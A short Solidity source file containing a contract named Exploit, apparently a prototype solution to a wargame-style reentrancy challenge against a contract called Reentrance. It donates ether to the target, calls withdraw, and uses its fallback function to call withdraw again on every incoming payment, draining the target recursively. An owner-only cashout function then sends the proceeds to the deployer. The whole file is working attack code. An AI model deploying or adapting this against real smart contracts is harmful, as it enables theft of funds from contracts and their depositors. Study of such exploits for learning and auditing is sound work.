// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

// STILL PROTOTYPE
contract Exploit {
    Reentrance public reentry;
    address payable owner;

    constructor(address payable _reentryAddress) public {
        owner = msg.sender;
        reentry = Reentrance(_reentryAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function sapItDry() external payable {
        reentry.donate{value: 2 ether}(address(this));
        reentry.withdraw(1000000000000000000);
    }

    fallback() external payable {
        reentry.withdraw(1000000000000000000);
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    //receive() external payable {
    //  reentry.withdraw(100000000000000);
    // }

    function cashout() external onlyOwner {
        (bool success, ) = owner.call{value: balance()}("");
        require(success, "Failed to send Ether");
    }
}
